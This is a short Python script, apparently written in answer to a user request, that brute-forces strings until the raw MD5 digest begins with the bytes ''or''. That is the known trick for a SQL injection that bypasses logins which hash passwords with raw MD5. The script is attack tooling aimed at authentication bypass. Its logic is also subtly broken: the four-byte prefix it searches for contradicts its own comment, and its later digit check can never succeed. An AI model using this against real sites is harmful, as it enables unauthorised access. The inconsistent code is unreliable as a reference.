import hashlib
import time

def find_magic_string():
    print("Searching for a string with MD5 starting with 'or'...")
    
    # We are looking for the byte sequence: 27 6f 72 ('or')
    # For a working exploit, you usually want: 27 6f 72 27 [31-39] ('or'1 through 'or'9)
    # This script focuses strictly on the user request: starting with 'or'
    
    target_prefix = b"'or'"
    
    # Counter for brute forcing (numbers are fastest to generate)
    i = 0
    start_time = time.time()
    
    while True:
        # Create candidate string (e.g., "1", "2", "3"...)
        candidate = str(i)
        
        # Calculate MD5 in raw bytes mode
        digest = hashlib.md5(candidate.encode()).digest()
        
        # Check if the binary digest starts with 'or'
        if digest.startswith(target_prefix):
            print(f"\n[+] FOUND MATCH!")
            print(f"String: {candidate}")
            print(f"Hex Digest: {digest.hex()}")
            print(f"Raw Digest Start: {digest[0:10]}...")
            
            # Check if it's a valid injection (followed by a digit)
            if len(digest) > 3 and digest[3] >= 0x30 and digest[3] <= 0x39:
                print("Note: This is also a valid 'or'1 style injection!")
            else:
                print("Note: Starts with 'or', but might need a closing quote/digit to validly break SQL.")
            break
            
        i += 1
        
        # Status update every 5 million attempts
        if i % 5000000 == 0:
            elapsed = time.time() - start_time
            print(f"Checked {i} hashes... ({int(i/elapsed)} hashes/sec)")

if __name__ == "__main__":
    find_magic_string()
